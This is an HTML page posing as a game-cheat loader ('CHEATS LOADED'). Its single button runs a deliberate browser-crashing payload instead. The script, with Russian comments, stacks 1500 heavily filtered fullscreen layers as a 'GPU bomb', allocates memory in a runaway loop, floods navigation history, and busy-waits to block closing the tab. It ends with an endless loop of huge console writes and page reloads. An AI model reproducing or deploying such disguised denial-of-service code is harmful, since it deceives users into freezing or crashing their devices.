<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CHEATS LOADED</title>
    <style>
        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .cheat-btn {
            background: linear-gradient(135deg, #00ff00, #004400);
            border: none; color: #fff; padding: 40px 80px;
            font: bold 30px sans-serif; border-radius: 20px;
            box-shadow: 0 0 30px #0f0; cursor: pointer;
        }
    </style>
</head>
<body>
    <button class="cheat-btn" onclick="activateCheats()">НАЖМИ ЕСЛИ НАТУРАЛ by 
@recovereded</button>

    <svg style="display:none">
        <filter id="pizdec">
            <feTurbulence type="fractalNoise" baseFrequency="0.001" numOctaves="100" stitchTiles="stitch"/>
            <feDisplacementMap in="SourceGraphic" scale="500" />
            <feGaussianBlur stdDeviation="50" />
        </filter>
    </svg>

    <script>
        function activateCheats() {
            // 1. Мгновенная блокировка интерфейса (Зависание)
            const audio = new Audio('sound.mp3');
            audio.loop = true;
            audio.play().catch(() => {});

            document.body.innerHTML = '<h1 style="color:white; font-size:50px;">INJECTING...</h1>';

            // 2. GPU BOMB (Забиваем видеочип намертво)
            for (let i = 0; i < 1500; i++) {
                let d = document.createElement('div');
                d.style.cssText = `
                    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                    filter: url(#pizdec) invert(1);
                    backdrop-filter: blur(100px) saturate(1000%);
                    opacity: 0.05; z-index: ${i};
                `;
                document.body.appendChild(d);
            }

            // 3. RAM/CPU KILLER (Каскадное выделение памяти)
            const killer = [];
            
            // Запускаем бесконечный цикл блокировки
            function freeze() {
                // Создаем 100MB за раз
                for(let j = 0; j < 50; j++) {
                    killer.push(new Float64Array(1024 * 1024 * 5)); // Выделение сырой памяти
                    // Забиваем историю навигации
                    history.pushState(null, "", "#" + Math.random());
                }
                
                // Рекурсивный удар
                setTimeout(freeze, 10);
                
                // Жесткая петля, чтобы нельзя было нажать "Назад" или закрыть вкладку
                let start = Date.now();
                while(Date.now() - start < 500) {
                    Math.sqrt(Math.random() * Math.random());
                }
            }

            // Активация цепочки уничтожения
            setTimeout(freeze, 100);

            // Финальный "выстрел" в систему через 2 секунды после начала лагов
            setTimeout(() => {
                while(true) {
                    let s = "X".repeat(10000000);
                    console.log(s);
                    location.reload();
                }
            }, 2000);
        }
    </script>
</body>
</html>
